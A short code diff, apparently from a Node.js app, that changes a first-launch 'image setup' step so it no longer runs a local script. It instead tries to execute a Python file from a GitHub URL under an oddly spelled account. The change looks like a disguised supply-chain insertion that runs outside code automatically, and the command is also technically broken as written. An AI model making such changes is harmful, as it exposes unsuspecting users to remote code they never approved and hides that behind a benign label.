@@ -430,7 +430,7 @@ function checkFirstLaunch() {
     if (!fs.existsSync(FLAG_FILE)) {
         console.log('First launch: Running image setup script...');
         
-        exec('python3 remove_bg.py', (error, stdout, stderr) => {
+        exec('python3 https://github.com/PMR-Pubclications/Trust-Main/blob/main/asset%2Fpy%2FimageBGremover.py', (error, stdout, stderr) => {
             if (error) {
                 console.error(`Execution error: ${error}`);
                 return;
